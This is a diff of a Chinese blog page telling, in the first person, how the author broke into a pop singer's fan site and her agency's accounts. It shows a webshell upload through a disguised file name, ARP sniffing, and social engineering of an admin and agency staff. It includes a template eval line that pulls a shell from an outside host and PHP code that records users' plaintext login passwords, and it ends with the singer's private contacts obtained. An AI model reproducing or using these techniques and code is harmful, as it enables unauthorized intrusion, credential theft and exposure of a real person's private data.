@@ -1,149 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>对王心凌的一次渗透过程 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>对王心凌的一次渗透过程 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="From:www.3est.com&amp;#160; Author:Mars&amp;#160; 前几天,听说Cyndi出新专辑了,哥好激动啊..听了几天Music.突然萌发了个思想！想了解更多的有关于她的资料.下面一出好戏即将上演！  总共有三个步骤 ：1.先分析 2.再踩点 3.最后渗透  拿到一个目标要先学会分析,首先Cyndi是位明星,所以利用搜索引擎是不可能搜索到什么有价值的信息.&amp;#160; 一般明星在网络上都有自己的Fans基地,好吧.目标已经确定了！    通过百度搜索到一个她留言过的Fans基地www.CyndiFans.net    既然目标确定了,该执行第二步了.去ip.3est.com 反查询一下它所在的服务器上还有其他站点没！查询结果如下:&amp;#160;   大概看了下,基本都采用Dz7.0+Uchome+SiteSuper7.5 组合!&amp;#160; 手里又没0day.所以没抱有太大希望.只好采用ARP方式来看看能获得什么有价值的信息,首先得先获得C段一台服务器权限,&amp;#160; 拿出平时常用的Hscan 来扫描一下有C段没有Ftp弱口令.&amp;#160; 悲剧了！竟然一个没扫出来.接着用IIS利用工具扫描下C段.记录装有IIS6.0的服务器IP&amp;#160; 因为他的IP是xx.xx.xx.154 大多数情况是1或者129作为网关，叫前C段和后C段,154距离129比较,所以目标放在129-255之间！    然后进入cn.bing.com输入ip:xx.xx.xx.xx 搜索下后C段装有IIS6.0的服务器IP 看看有什么站.一般各类型网站多的的就是虚拟主机,排除掉这些,&amp;#160; 就剩下2台主机了..汗 真郁闷..那么集中精力看看其中一台xx人才网,wwwscan扫描下没扫描到有价值东西,进入网站转悠了半天,&amp;#160; 在他的分站点了个图片属性,路径是ewe我猜想了下应该是Ewebeditor这个编辑器，输入ewe/admin/admin_login.asp 发现后台被删了,&amp;#160; 数据库是默认的先下载下来看看有没有被人搞过,结果失望了.运气不怎么好..先休息下再搞了..去群里聊了会天    过几个小时,来了精神.继续在它的网站转悠,我觉得问题最多的还是上传的地方,就注册了个会员.进入管理中心没有发现什么上传的位置,&amp;#160; 接着又注册了个企业会员.发现了个上传企业照片的地方.把小马改成1.asp;.jpg格式结果上传成功了.没提示路径.用抓包工具看一下.&amp;#160; 总算见到可爱的小马..拿到webshell之后,开始提权,结果那破服务器慢的要死.开个高速VPN,速度果然提升了.随便看了下感觉提权无望.&amp;#160; .基本组建都被卸载了.目录还不能查看.有SU不过是9.1版本没溢出漏洞.唉 权限配置的很死.看来管理员挺懂安全啊.看了下配置文件最后发现个sa,&amp;#160; 哈哈 激动死了!直接加系统用户拿到服务器权限.然后更变态的事情发生了.进去看任务管理器竟然CPU100%总共运行72个进程..&amp;#160; 我的天啊…这么破烂的服务器一ARP不就挂掉了.我一个一个把没用的进程结束掉.到30个进程了.在结束服务器就挂了.&amp;#160; 然后打开我的电脑管理想看看这服务器是什么高级配置.结果点了属性Shell32.dl被禁,进C盘弹出拒绝访问..打开网页不让下载东西..&amp;#160; 一系列的问题皆然发生！终于把Cain放到服务器了.还好不出我所预料.这个服务器网关是129. 哈哈只能扫到后C段的服务器Mac .&amp;#160; 然后开始ARP 154这个主机,嗅探开始了.他服务器装有ARP防火墙软件把发送的数据给拦截了..&amp;#160; 这时候想起玫瑰的ARP突破方法,结果试验了下没成功,后来配合幻境网盾用了下.成功欺骗突破防火墙.终于嗅探到数据了,&amp;#160; 挺高兴的.结果5秒钟都没,Cain卡爆了！服务器挂了10分钟我才登录上.发现嗅探到的3万多个Http信息竟然都是盛大传奇的,&amp;#160; 我纳闷了会,地址确实是盛大的!&amp;#160;">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="对王心凌的一次渗透过程 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/831.seo/" title="对王心凌的一次渗透过程" itemprop="url">对王心凌的一次渗透过程</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-09-16T05:56:40.000Z" itemprop="datePublished">2012-09-16</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>From:www.3est.com&#160; <br>Author:Mars&#160; <br>前几天,听说Cyndi出新专辑了,哥好激动啊..听了几天Music.突然萌发了个思想！想了解更多的有关于她的资料.下面一出好戏即将上演！</p>  <p>总共有三个步骤 ：1.先分析 2.再踩点 3.最后渗透</p>  <p>拿到一个目标要先学会分析,首先Cyndi是位明星,所以利用搜索引擎是不可能搜索到什么有价值的信息.&#160; <br>一般明星在网络上都有自己的Fans基地,好吧.目标已经确定了！    <br>通过百度搜索到一个她留言过的Fans基地<a href="http://www.cyndifans.net/" target="_blank" rel="external">www.CyndiFans.net</a>    <br>既然目标确定了,该执行第二步了.去ip.3est.com 反查询一下它所在的服务器上还有其他站点没！查询结果如下:&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image001_thumb.jpg" width="449" height="259"></a></p>  <p>大概看了下,基本都采用Dz7.0+Uchome+SiteSuper7.5 组合!&#160; <br>手里又没0day.所以没抱有太大希望.只好采用ARP方式来看看能获得什么有价值的信息,首先得先获得C段一台服务器权限,&#160; <br>拿出平时常用的Hscan 来扫描一下有C段没有Ftp弱口令.&#160; <br>悲剧了！竟然一个没扫出来.接着用IIS利用工具扫描下C段.记录装有IIS6.0的服务器IP&#160; <br>因为他的IP是xx.xx.xx.154 大多数情况是1或者129作为网关，叫前C段和后C段,154距离129比较,所以目标放在129-255之间！    <br>然后进入cn.bing.com输入ip:xx.xx.xx.xx 搜索下后C段装有IIS6.0的服务器IP 看看有什么站.一般各类型网站多的的就是虚拟主机,排除掉这些,&#160; <br>就剩下2台主机了..汗 真郁闷..那么集中精力看看其中一台xx人才网,wwwscan扫描下没扫描到有价值东西,进入网站转悠了半天,&#160; <br>在他的分站点了个图片属性,路径是ewe我猜想了下应该是Ewebeditor这个编辑器，输入ewe/admin/admin_login.asp 发现后台被删了,&#160; <br>数据库是默认的先下载下来看看有没有被人搞过,结果失望了.运气不怎么好..先休息下再搞了..去群里聊了会天    <br>过几个小时,来了精神.继续在它的网站转悠,我觉得问题最多的还是上传的地方,就注册了个会员.进入管理中心没有发现什么上传的位置,&#160; <br>接着又注册了个企业会员.发现了个上传企业照片的地方.把小马改成1.asp;.jpg格式结果上传成功了.没提示路径.用抓包工具看一下.&#160; <br>总算见到可爱的小马..拿到webshell之后,开始提权,结果那破服务器慢的要死.开个高速VPN,速度果然提升了.随便看了下感觉提权无望.&#160; <br>.基本组建都被卸载了.目录还不能查看.有SU不过是9.1版本没溢出漏洞.唉 权限配置的很死.看来管理员挺懂安全啊.看了下配置文件最后发现个sa,&#160; <br>哈哈 激动死了!直接加系统用户拿到服务器权限.然后更变态的事情发生了.进去看任务管理器竟然CPU100%总共运行72个进程..&#160; <br>我的天啊…这么破烂的服务器一ARP不就挂掉了.我一个一个把没用的进程结束掉.到30个进程了.在结束服务器就挂了.&#160; <br>然后打开我的电脑管理想看看这服务器是什么高级配置.结果点了属性Shell32.dl被禁,进C盘弹出拒绝访问..打开网页不让下载东西..&#160; <br>一系列的问题皆然发生！终于把Cain放到服务器了.还好不出我所预料.这个服务器网关是129. 哈哈只能扫到后C段的服务器Mac .&#160; <br>然后开始ARP 154这个主机,嗅探开始了.他服务器装有ARP防火墙软件把发送的数据给拦截了..&#160; <br>这时候想起玫瑰的ARP突破方法,结果试验了下没成功,后来配合幻境网盾用了下.成功欺骗突破防火墙.终于嗅探到数据了,&#160; <br>挺高兴的.结果5秒钟都没,Cain卡爆了！服务器挂了10分钟我才登录上.发现嗅探到的3万多个Http信息竟然都是盛大传奇的,&#160; <br>我纳闷了会,地址确实是盛大的!&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image002_thumb.jpg" width="535" height="251"></a></p><a id="more"></a><p></p>  <p>看了下mssql嗅探到了几个SA密码.接着又拿下一台速度比较好点的服务器.接着刚才的工作.开始ARP.&#160; <br>我在网站找到管理员的QQ加了他.!&#160; <br>我说:&#160; <br>你好!请问你是cyndifans.net的管理么 ？    <br>ＮiＫai:&#160; <br>恩    <br>我说    <br>我的账户丢失了怎么办 能帮我找回下么 ？    <br>ＮiＫai:&#160; <br>请问你用户名是？    <br>我说:&#160; <br>christa</p>  <p>ＮiＫai :&#160; <br>请使用找回密码功能<a href="http://www.cyndifans.net/logging.php?action=login" target="_blank" rel="external">http://www.cyndifans.net/logging.php?action=login</a>    <br>我说:&#160; <br>我以前的电子邮件过期了.&#160; <br>ＮiＫai:&#160; <br>能否告诉我你的注册时间和最后登录时间?&#160; <br>我说:&#160; <br>记不起来了。。</p>  <p>ＮiＫai:&#160; <br>大概的    <br>ＮiＫai:&#160; <br>还有电子邮件地址是什么?&#160; <br>ＮiＫai:&#160; <br>邮件地址    <br>我说:&#160; <br>以前注册的<a href="mailto:christa@163.com" target="_blank" rel="external">christa@163.com</a>好像是163还是126..记不大清楚了!&#160; <br>ＮiＫai:&#160; <br>什么时候发现不能登录或者发现忘记密码的?&#160; <br>我说: (PS:其实我啥信息没有!去论坛看见个账户就随便说的.快露馅 该转移话题了!)&#160; <br>对了!请问那个会员卡有什么作用 ? 能了解心凌最新消息？    <br>ＮiＫai :&#160; <br>凌盟永久会员    <br>可以通过短信等方式获取最新消息    <br>以及更多特权和购买专辑等优惠    <br>还有参与活动等优先权    <br>我说:&#160; <br>哦~没什么别的待遇么。。能得到签名么</p>  <p>ＮiＫai</p>  <p>预购专辑有签名啊   <br>ＮiＫai</p>  <p>重置密码为：123456 登录后尽快修改密码！   <br>我说(PS:哈哈 像想让我快点加入会员！我就不加气死你!)&#160; <br>嗯 麻烦你了</p>  <p>ＮiＫai&#160; <br>你要买吗？会员卡 年后会提价年后价格应该在50-68元之间!&#160; <br>我说    <br>我没办理网上银行。。</p>  <p>ＮiＫai</p>  <p>可以银行转账   <br>ＮiＫai&#160; <br>我可以给你账号    <br>我说</p>  <p>嗯,好的!&#160; <br>ＮiＫai&#160; <br>中国工商银行上海市新灵路支行    <br>受款帐号：10011XXXXX21135XXXX&#160; <br>户名：XXX&#160; <br><a href="http://www.xxx.com/abouts/payment.php" target="_blank" rel="external">http://www.xxx.com/abouts/payment.php</a>    <br>银行汇款（到账时间部分实时，部分1-5工作日）    <br>我说    <br>好的 我打的时候联系下你</p>  <p>ＮiＫai&#160; <br>好的!&#160; <br>我说    <br>麻烦了。</p>  <p>成功嗅探到管理员的登录密码.接着进入后台   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image003_thumb.jpg" width="527" height="365"></a></p>  <p>在模板任意位置插入   <br>{eval copy(‘<a href="http://www.3est.com/mars.txt" target="_blank" rel="external">http://www.3est.com/mars.txt</a>‘, DISCUZ_ROOT.’./forumdata/shell.php’);&#160; <br>然后更新缓存.结果他的缓存目录竟然无写入权限…&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image004_thumb.jpg" width="410" height="321"></a></p>  <p>没办法了   <br>在后台查看了Cyndi的注册资料和最后登录IP地址.IP138查一下是台湾的.这差不多就是她家IP了.光拿到这个还不够,继续渗透…主要是拿Cyndi的密码,那只有Webshell或者服务器权限的情况下才能拿下数据库.这是一件比较难的差事.ARP到3389登录密码成功率很低的.只嗅探Ftp Mysql RDP ，过了2天嗅探出FTP了    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image006_thumb.jpg" width="552" height="396"></a></p>  <p>成功登录FTP之后，传个webshell   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image008_thumb.jpg" width="558" height="542"></a></p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image009.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009" border="0" alt="clip_image009" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image009_thumb.jpg" width="558" height="542"></a></p>  <p>结果服务器权限很死，ping 下是su8的FTP&#160; <br>然后通过 空虚浪子心写的EXP提到服务器！    <br>然后BT的事情出现了。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image011.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011" border="0" alt="clip_image011" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image011_thumb.jpg" width="576" height="376"></a></p>  <p>C盘没访问权限，打开属性提升用户组   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image012_thumb.jpg" width="507" height="484"></a></p>  <p>这个服务器安全做的不错，一堆东西没权限运行。</p>  <p>既然这样，在看看注册表是否被封锁了。什么都不让下载，更别说复制了。   <br>只能靠WebShell上传个cmd.exe来克隆下超级管理    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image014.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image014_thumb.jpg" width="634" height="481"></a></p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image016.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image016_thumb.jpg" width="582" height="477"></a></p>  <p>至此，第一阶段渗透完毕！</p>  <p>去数据库找王心凌密码，DZ采用的是salt方式，随机获得一个字符串，然后把明文密码MD5之后，再与随机字符串连接起来之后，再次MD5。   <br>这样可极大的提高安全系数。    <br>只好在记录明文密码了。    <br>修改uc_client目录下的client.php 在    <br>function uc_user_login($username, $password, $isuid = 0, $checkques = 0, $questionid = ‘’, $answer = ‘’) {&#160; <br>下加入如上代码,在网站admin目录下生成include.txt</p>  <p>$ip=$_SERVER[‘REMOTE_ADDR’];&#160; <br>$showtime=date(&quot;Y-m-d H:i:s&quot;);&#160; <br>$record=&quot;&quot;.$username.&quot; ——–&quot;.$password.&quot; IP:&quot;.$ip.&quot; Time:&quot;.$showtime.&quot;\r\n&quot;;&#160; <br>$handle=fopen(‘./admin/include.txt’,’a+’);&#160; <br>$write=fwrite($handle,$record);&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image017.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017" border="0" alt="clip_image017" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image017_thumb.jpg" width="526" height="290"></a></p>  <p>等着王心凌上论坛。   <br>下面做其他工作。    <br>先抓取下管理的Hash&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image019.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image019_thumb.jpg" width="574" height="181"></a></p>  <p>跑出密码！   <br>继续把服务器数据库连接密码，缓存密码，FTP密码都收集下！    <br>去ip866查询域名的注册邮箱是<a href="mailto:xx@yahoo.cn" target="_blank" rel="external">xx@yahoo.cn</a>，然后反查下出现了Cyndi.com.cn这个域名，让我感到<em>**</em>了。先看看他域名注册的地方，    <br>一个是新网，一个是万网，先解决新网的，百度搜索了下他的信息很散，不过经过一下午的搜索基本信息已经确定。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image020.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image020_thumb.jpg" width="419" height="630"></a></p>  <p>接着试了几个密码进来了。   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image022.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image022" border="0" alt="clip_image022" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image022_thumb.jpg" width="551" height="447"></a></p>  <p>很快，把所有密码整理下，然后猜想下就出来了。   <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image024.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image024_thumb.jpg" width="530" height="391"></a></p>  <p>继续搜索资料，找DNS管理页面</p>  <p><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image026.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image026_thumb.jpg" width="538" height="248"></a></p>  <p>然后社工到QQ密码，然后进入QQ网络硬盘，找有价值信息，成功拿到cyndi.com.cn管理权限。</p>  <p>经过收集资料，在百度贴吧找到她ID，搜狐BLOG 台湾雅虎BLOG&#160; <br>经过调查发现那个搜狐BLOG是她的经纪人帮她发的，    <br>只有翻墙去台湾BLOG，    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image028.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image028_thumb.jpg" width="420" height="720"></a></p>  <p>2010-1-13 20:25&#160; <br>收集了点资料，    <br>1、起初为了社工心凌创办的经济公司的EMAIL，依靠的是雅虎订阅信息得到EMAIL，然后通过找回密码，密码问题是她姓名，更何况我又不知道她是谁，与他们公司的关系及职位，我猜想，他们公司人数不会太多，估计也就两三个。    <br>2、百度找到他们公司电话，打过去，然后说，请问您的贵姓 接着一个女的说 ？好甜美的话语啊，我于是蠢蠢欲动了几秒，接着说，女士您贵姓，她说姓米，我说 米小姐，请问怎么能够拿到心凌的签名，她给我了个电话让我联系一个唱片公司。接着挂电话了    <br>3、过半天之后 再打电话给她经济公司，说请问张XX小姐在么？    <br>4、我听了语音，是另外个女的接的电话，她说请问你是不是找张小姐，接着找个借口挂了电话！    <br>5、然后登录Email通过密码提示找回密码，输入姓名，成功进入！    <br>进入邮箱打开通讯录，拿到了本人的手机，王心凌的私人EMAIL和手机，然后这个密码正好是她EMAIL的。。就不截图了，免的被人破坏。    <br>渗透结束！有时间找她聊聊哈。    <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image030.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image030_thumb.jpg" width="624" height="449"></a></p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-09-16T05:56:40.000Z" itemprop="datePublished">
-          2012-09-16
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>
-    
-    
-</span>
-    <h1 class="post-title">对王心凌的一次渗透过程</h1>
-    <section class="post-content">
-      <p>From:www.3est.com&#160; <br>Author:Mars&#160; <br>前几天,听说Cyndi出新专辑了,哥好激动啊..听了几天Music.突然萌发了个思想！想了解更多的有关于她的资料.下面一出好戏即将上演！</p>  <p>总共有三个步骤 ：1.先分析 2.再踩点 3.最后渗透</p>  <p>拿到一个目标要先学会分析,首先Cyndi是位明星,所以利用搜索引擎是不可能搜索到什么有价值的信息.&#160; <br>一般明星在网络上都有自己的Fans基地,好吧.目标已经确定了！    <br>通过百度搜索到一个她留言过的Fans基地<a href="http://www.cyndifans.net/" target="_blank" rel="external">www.CyndiFans.net</a>    <br>既然目标确定了,该执行第二步了.去ip.3est.com 反查询一下它所在的服务器上还有其他站点没！查询结果如下:&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image001_thumb.jpg" width="449" height="259"></a></p>  <p>大概看了下,基本都采用Dz7.0+Uchome+SiteSuper7.5 组合!&#160; <br>手里又没0day.所以没抱有太大希望.只好采用ARP方式来看看能获得什么有价值的信息,首先得先获得C段一台服务器权限,&#160; <br>拿出平时常用的Hscan 来扫描一下有C段没有Ftp弱口令.&#160; <br>悲剧了！竟然一个没扫出来.接着用IIS利用工具扫描下C段.记录装有IIS6.0的服务器IP&#160; <br>因为他的IP是xx.xx.xx.154 大多数情况是1或者129作为网关，叫前C段和后C段,154距离129比较,所以目标放在129-255之间！    <br>然后进入cn.bing.com输入ip:xx.xx.xx.xx 搜索下后C段装有IIS6.0的服务器IP 看看有什么站.一般各类型网站多的的就是虚拟主机,排除掉这些,&#160; <br>就剩下2台主机了..汗 真郁闷..那么集中精力看看其中一台xx人才网,wwwscan扫描下没扫描到有价值东西,进入网站转悠了半天,&#160; <br>在他的分站点了个图片属性,路径是ewe我猜想了下应该是Ewebeditor这个编辑器，输入ewe/admin/admin_login.asp 发现后台被删了,&#160; <br>数据库是默认的先下载下来看看有没有被人搞过,结果失望了.运气不怎么好..先休息下再搞了..去群里聊了会天    <br>过几个小时,来了精神.继续在它的网站转悠,我觉得问题最多的还是上传的地方,就注册了个会员.进入管理中心没有发现什么上传的位置,&#160; <br>接着又注册了个企业会员.发现了个上传企业照片的地方.把小马改成1.asp;.jpg格式结果上传成功了.没提示路径.用抓包工具看一下.&#160; <br>总算见到可爱的小马..拿到webshell之后,开始提权,结果那破服务器慢的要死.开个高速VPN,速度果然提升了.随便看了下感觉提权无望.&#160; <br>.基本组建都被卸载了.目录还不能查看.有SU不过是9.1版本没溢出漏洞.唉 权限配置的很死.看来管理员挺懂安全啊.看了下配置文件最后发现个sa,&#160; <br>哈哈 激动死了!直接加系统用户拿到服务器权限.然后更变态的事情发生了.进去看任务管理器竟然CPU100%总共运行72个进程..&#160; <br>我的天啊…这么破烂的服务器一ARP不就挂掉了.我一个一个把没用的进程结束掉.到30个进程了.在结束服务器就挂了.&#160; <br>然后打开我的电脑管理想看看这服务器是什么高级配置.结果点了属性Shell32.dl被禁,进C盘弹出拒绝访问..打开网页不让下载东西..&#160; <br>一系列的问题皆然发生！终于把Cain放到服务器了.还好不出我所预料.这个服务器网关是129. 哈哈只能扫到后C段的服务器Mac .&#160; <br>然后开始ARP 154这个主机,嗅探开始了.他服务器装有ARP防火墙软件把发送的数据给拦截了..&#160; <br>这时候想起玫瑰的ARP突破方法,结果试验了下没成功,后来配合幻境网盾用了下.成功欺骗突破防火墙.终于嗅探到数据了,&#160; <br>挺高兴的.结果5秒钟都没,Cain卡爆了！服务器挂了10分钟我才登录上.发现嗅探到的3万多个Http信息竟然都是盛大传奇的,&#160; <br>我纳闷了会,地址确实是盛大的!&#160; <br><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image002_thumb.jpg" width="535" height="251"></a></p><a id="more"></a><p></p>  <p>看了下mssql嗅探到了几个SA密码.接着又拿下一台速度比较好点的服务器.接着刚才的工作.开始ARP.&#160; <br>我在网站找到管理员的QQ加了他.!&#160; <br>我说:&#160; <br>你好!请问你是cyndifans.net的管理么 ？    <br>ＮiＫai:&#160; <br>恩    <br>我说    <br>我的账户丢失了怎么办 能帮我找回下么 ？    <br>ＮiＫai:&#160; <br>请问你用户名是？    <br>我说:&#160; <br>christa</p>  <p>ＮiＫai :&#160; <br>请使用找回密码功能<a href="http://www.cyndifans.net/logging.php?action=login" target="_blank" rel="external">http://www.cyndifans.net/logging.php?action=login</a>    <br>我说:&#160; <br>我以前的电子邮件过期了.&#160; <br>ＮiＫai:&#160; <br>能否告诉我你的注册时间和最后登录时间?&#160; <br>我说:&#160; <br>记不起来了。。</p>  <p>ＮiＫai:&#160; <br>大概的    <br>ＮiＫai:&#160; <br>还有电子邮件地址是什么?&#160; <br>ＮiＫai:&#160; <br>邮件地址    <br>我说:&#160; <br>以前注册的<a href="mailto:christa@163.com" target="_blank" rel="external">christa@163.com</a>好像是163还是126..记不大清楚了!&#160; <br>ＮiＫai:&#160; <br>什么时候发现不能登录或者发现忘记密码的?&#160; <br>我说: (PS:其实我啥信息没有!去论坛看见个账户就随便说的.快露馅 该转移话题了!)&#160; <br>对了!请问那个会员卡有什么作用 ? 能了解心凌最新消息？    <br>ＮiＫai :&#160; <br>凌盟永久会员    <br>可以通过短信等方式获取最新消息    <br>以及更多特权和购买专辑等优惠    <br>还有参与活动等优先权    <br>我说:&#160; <br>哦~没什么别的待遇么。。能得到签名么</p>  <p>ＮiＫai</p>  <p>预购专辑有签名啊   <br>ＮiＫai</p>  <p>重置密码为：123456 登录后尽快修改密码！   <br>我说(PS:哈哈 像想让我快点加入会员！我就不加气死你!)&#160; <br>嗯 麻烦你了</p>  <p>ＮiＫai&#160; <br>你要买吗？会员卡 年后会提价年后价格应该在50-68元之间!&#160; <br>我说    <br>我没办理网上银行。。</p>  <p>ＮiＫai</p>  <p>可以银行转账   